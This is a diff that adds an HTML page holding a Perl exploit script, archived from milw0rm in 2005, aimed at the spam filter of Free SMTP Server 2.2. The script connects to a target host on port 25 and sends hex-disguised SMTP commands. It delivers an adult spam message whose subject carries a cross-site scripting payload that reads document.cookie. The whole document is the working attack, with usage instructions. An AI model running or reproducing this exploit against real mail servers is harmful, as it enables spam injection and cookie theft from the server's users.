@@ -1,0 +1,86 @@
+<html>
+<head>
+<title>Free SMTP Server <= 2.2 Spam Filter Vulnerability</title>
+<pre>
+#!usr/bin/perl
+#
+#    FREE SMTP Spam Filter Exploit
+# ------------------------------------
+#  Infam0us Gr0up - Securiti Research
+#
+# Info: infamous.2hell.com
+# Vendor URL: http://www.softstack.com/
+# 
+
+use IO::Socket;
+use Socket;
+
+print(&quot;\n   FREE SMTP Spam Filter Exploit\n&quot;);
+print(&quot; ---------------------------------\n\n&quot;);
+
+# Changes to own feed 
+$helo = &quot;mail.test&quot;; # HELO
+$mfrom = &quot;[support@vuln.test]&quot;; # MAIL FROM
+$rcpto = &quot;[root@localhost]&quot;; # RCPT TO
+$date = &quot;11 Feb 2099 12:07:10&quot;; # Date
+$from = &quot;Micro SEX's&quot;; # From mailer
+$subject = &quot;Check the new version.. ооо\n&quot;.
+&quot;[b]VICKY VETTE[/b][i]is HOT Editon.Check it OUT!!. Free Nude Shop. Sex,video,picture,toys and XXX Chat Adults live!!![/i]&quot;.
+&quot;[br][a href=http://127.0.0.1 onMouseOver=alert(document.cookie);]Click Here[/a]&quot;; # subject spammmer
+
+if($#ARGV &lt; 0 | $#ARGV &gt; 1) { 
+die &quot;usage: perl $0 [IP/host] \nExam: perl $0 127.0.0.1 \n&quot; };
+
+$adr = $ARGV[0];
+$prt = &quot;25&quot;;
+
+# Don't changes this one
+$act1 = &quot;\x48\x45\x4c\x4f $helo&quot;;
+$act2 = &quot;\x4d\x41\x49\x4c \x46\x52\x4f\x4d\x3a$mfrom&quot;;
+$act3 = &quot;\x52\x43\x50\x54 f\x54\x4f\x3a$rcpto&quot;;
+$act4 = &quot;\x44\x41\x54\x41&quot;;
+$act5 = &quot;\x44\x61\x74\x65\x3a $date&quot;;
+
+$sub = 
+&quot;\x46\x72\x6f\x6d\x3a $from&quot;.
+&quot;\x53\x75\x62\x6a\x65\x63\x74\x3a $subject\x2e&quot;.
+&quot;\x51\x55\x49\x54&quot;;
+
+print &quot;[+] Connect to $adr..\n&quot;;
+$remote = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$adr,
+PeerPort=&gt;$prt, Reuse=&gt;1) or die &quot;[-] Error: can't connect to $adr:$prt\n&quot;;
+print &quot;[+] Connected!\n&quot;;
+$remote-&gt;autoflush(1);
+print &quot;[*] Send HELO..&quot;;
+print $remote &quot;$act1&quot; or die &quot;\n[-] Error: can't send xploit code\n&quot;;
+sleep(1);
+print &quot;[OK]\n&quot;;
+print &quot;[*] Send MAIL FROM..&quot;;
+print $remote &quot;$act2&quot; or die &quot;\n[-] Error: can't send xploit code\n&quot;;
+sleep(1);
+print &quot;[OK]\n&quot;;
+print &quot;[*] Send RCPT TO..&quot;;
+print $remote &quot;$act3&quot; or die &quot;\n[-] Error: can't send xploit code\n&quot;;
+sleep(1);
+print &quot;[OK]\n&quot;;
+print &quot;[*] Send DATA..&quot;;
+print $remote &quot;$act4&quot; or die &quot;\n[-] Error: can't send xploit code\n&quot;;
+sleep(1);
+print &quot;[OK]\n&quot;;
+print &quot;[*] Send DATE..&quot;;
+print $remote &quot;$act5&quot; or die &quot;\n[-] Error: can't send xploit code\n&quot;;
+sleep(1);
+print &quot;[OK]\n&quot;;
+print &quot;[*] Send Sub Mail..&quot;;
+print $remote &quot;$sub&quot; or die &quot;\n[-] Error: can't send xploit code\n&quot;;
+print &quot;[OK]\n&quot;;
+print &quot;[*] QUIT..\n&quot;;
+print &quot;[+] MAIL SPAMWNED!\n\n&quot;;
+close $remote;
+print &quot;press any key to exit..\n&quot;;
+$bla= [STDIN];
+
+# milw0rm.com [2005-09-02]
+</pre>
+</html>
+
